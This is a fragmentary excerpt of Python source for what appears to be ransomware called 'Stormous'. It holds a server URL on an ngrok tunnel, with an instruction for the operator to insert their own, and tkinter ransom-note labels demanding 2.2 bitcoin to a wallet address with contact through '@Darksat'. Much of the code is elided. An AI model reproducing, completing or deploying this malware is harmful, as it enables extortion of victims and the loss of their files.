...
url = 'http://cbba-31-166-66-25.ngrok.io' # PUT THE URL YOU GOT FROM NGROK HERE
...
def DECRYPT_FILE():
    ...
    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED BY: STORMOUS RANSOME ') # Title
    ...
    label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH OUR Viruses.') # Title
    ...
    label1 = tk.Label(root, text='to decrypt them, send 2.2 in bitcoin to 1NMYeez3ZYuDP9srrQNjG9D99Q6i3e4Nyz, and them send proof of tranfer and your DIGITS to @Darksat WITHOUT YOUR PAYMENT Process THERE IS NO WAY TO BACK IT ! ') # Title
